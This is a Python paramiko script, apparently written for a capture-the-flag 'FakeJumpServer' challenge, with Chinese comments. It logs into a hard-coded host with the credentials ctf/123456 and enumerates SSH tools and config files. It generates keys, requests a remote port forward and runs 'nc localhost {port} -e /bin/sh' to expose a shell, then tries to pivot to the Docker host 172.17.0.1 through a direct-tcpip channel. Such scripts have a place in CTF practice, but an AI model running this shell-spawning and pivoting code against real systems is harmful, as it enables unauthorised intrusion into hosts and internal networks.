import paramiko
import socket
import time
import sys

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def exec_cmd(ssh, cmd, timeout=30):
    """执行命令并返回输出"""
    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode()
    err = stderr.read().decode()
    return out + err

def check_internal_ssh():
    """检查内部是否有SSH客户端"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    # 检查可用的命令
    cmds = [
        "ls -la /bin/ | grep -E 'ssh|db'",
        "ls -la /usr/bin/ | grep -E 'ssh|db'",
        "which dbclient",
        "which ssh",
        "busybox --list | grep -i ssh",
    ]
    
    for cmd in cmds:
        print(f"[*] {cmd}")
        print(exec_cmd(ssh, cmd))
    
    # 如果有dbclient，尝试用它连接
    print("\n[*] 尝试dbclient...")
    # Dropbear的客户端是dbclient
    cmds = [
        "dbclient --help",
        "dbclient -h",
    ]
    for cmd in cmds:
        print(f"[*] {cmd}")
        print(exec_cmd(ssh, cmd))
    
    ssh.close()

def explore_dropbear_features():
    """探索dropbear的功能"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    # 尝试通过dbclient连接到宿主机
    print("[*] 尝试通过dbclient连接到172.17.0.1...")
    
    # 生成一个SSH key
    cmds = [
        "mkdir -p ~/.ssh",
        "dropbearkey -t ed25519 -f ~/.ssh/id_ed25519",
        "dropbearkey -y -f ~/.ssh/id_ed25519",
    ]
    
    for cmd in cmds:
        print(f"[*] {cmd}")
        print(exec_cmd(ssh, cmd))
    
    ssh.close()

def test_ssh_proxycommand():
    """测试SSH ProxyCommand特性"""
    # FakeJumpServer漏洞通常涉及ProxyCommand的命令注入
    # 当使用 ssh -J 时，中间跳板机会执行某些操作
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 测试通过direct-tcpip转发执行命令
    # 一些SSH实现在处理-J时会启动一个SSH客户端进程
    
    # 检查dropbear如何处理转发
    print("[*] 检查转发时dropbear的行为...")
    
    # 在转发的同时检查进程
    print(exec_cmd(ssh, "ps aux"))
    
    ssh.close()

def test_remote_forward_abuse():
    """测试远程端口转发滥用"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 请求远程端口转发到宿主机
    # 如果我们能让跳板机监听一个端口，然后转发到宿主机...
    
    # 尝试请求一个转发到外部的端口
    try:
        port = transport.request_port_forward('', 0)  # 让服务器选择端口
        print(f"[+] 远程端口转发开启，端口: {port}")
        
        # 现在尝试从内部连接这个端口
        cmd = f"nc localhost {port} -e /bin/sh &"
        print(f"[*] 尝试: {cmd}")
        print(exec_cmd(ssh, cmd))
        
    except Exception as e:
        print(f"[-] 远程端口转发失败: {e}")
    
    ssh.close()

def try_hostkeycommand():
    """尝试HostKeyCommand特性"""
    # 某些SSH配置可能允许执行命令来获取host key
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    # 检查是否有known_hosts可以利用
    print(exec_cmd(ssh, "cat /etc/ssh/*"))
    print(exec_cmd(ssh, "ls -la /etc/"))
    
    ssh.close()

def test_stdio_forwarding():
    """测试标准输入输出转发"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 尝试打开一个通道到宿主机的22端口，然后手动进行SSH握手
    print("[*] 尝试手动SSH握手到172.17.0.1...")
    
    channel = transport.open_channel("direct-tcpip", ('172.17.0.1', 22), ('127.0.0.1', 0))
    
    # 读取banner
    channel.settimeout(5)
    banner = channel.recv(1024)
    print(f"[*] Banner: {banner}")
    
    # 发送我们的版本
    channel.sendall(b"SSH-2.0-OpenSSH_8.6\r\n")
    
    # 读取更多响应
    try:
        response = channel.recv(4096)
        print(f"[*] Response: {response[:200]}")
    except:
        pass
    
    channel.close()
    ssh.close()

if __name__ == "__main__":
    print("="*50)
    print("[*] 探索SSH内部特性")
    print("="*50)
    
    print("\n[1] 检查内部SSH客户端")
    check_internal_ssh()
    
    print("\n[2] 探索dropbear")
    explore_dropbear_features()
    
    print("\n[3] 测试远程端口转发")
    test_remote_forward_abuse()
